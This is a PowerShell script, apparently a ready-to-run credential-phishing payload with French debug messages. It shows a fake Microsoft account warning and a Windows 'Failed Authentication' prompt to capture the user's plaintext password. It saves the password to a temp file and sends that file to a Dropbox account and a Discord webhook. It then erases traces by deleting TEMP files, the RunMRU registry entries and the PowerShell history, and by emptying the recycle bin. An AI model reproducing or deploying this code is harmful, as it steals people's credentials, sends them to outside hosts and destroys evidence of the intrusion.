function Get-Creds {
    $form = $null

    while ($form -eq $null) {
        Write-Host "DEBUG: Ouverture du dialogue credentials" -ForegroundColor Yellow
        
        $cred = $host.ui.promptforcredential('Failed Authentication', '', [Environment]::UserDomainName + '\' + [Environment]::UserName, [Environment]::UserDomainName)
        
        # CRUCIAL: L'utilisateur a cliqué "Annuler"
        if ($cred -eq $null) {
            Write-Host "Annulé par l'utilisateur" -ForegroundColor Red
            return $null
        }
        
        $password = $cred.GetNetworkCredential().Password
        
        if ([string]::IsNullOrWhiteSpace($password)) {
            Add-Type -AssemblyName PresentationCore,PresentationFramework
            [System.Windows.MessageBox]::Show("Credentials cannot be empty!", "Error", "Ok", "Stop") | Out-Null
            $form = $null
        }
        else {
            Write-Host "DEBUG: Credentials récupérées avec succès" -ForegroundColor Green
            $form = $cred.GetNetworkCredential()
            return $form
        }
    }
}

#----------------------------------------------------------------------------------------------------

function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

#----------------------------------------------------------------------------------------------------

function Caps-Off {
Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

if ($caps -eq $true){
$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
}

#----------------------------------------------------------------------------------------------------

Pause-Script

Caps-Off

Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBody = "Please authenticate your Microsoft Account."
$msgTitle = "Authentication Required"
$msgButton = 'Ok'
$msgImage = 'Warning'

Write-Host "DEBUG: Avant MessageBox" -ForegroundColor Yellow

try {
    $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
    Write-Host "DEBUG: Après MessageBox, Result = $Result" -ForegroundColor Yellow
}
catch {
    Write-Host "ERROR dans MessageBox: $_" -ForegroundColor Red
    exit
}

Write-Host "DEBUG: Avant Get-Creds" -ForegroundColor Yellow

try {
    $creds = Get-Creds
    Write-Host "DEBUG: Après Get-Creds" -ForegroundColor Yellow
}
catch {
    Write-Host "ERROR dans Get-Creds: $_" -ForegroundColor Red
    exit
}

Write-Host "DEBUG: Credentials obtenues, suite du script..." -ForegroundColor Yellow

#------------------------------------------------------------------------------------------------------------------------------------

echo $creds >> $env:TMP\$FileName

#------------------------------------------------------------------------------------------------------------------------------------

function DropBox-Upload {

[CmdletBinding()]
param (
	
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 
$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $db
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\$FileName}

#------------------------------------------------------------------------------------------------------------------------------------

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName}

#------------------------------------------------------------------------------------------------------------------------------------

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

exit
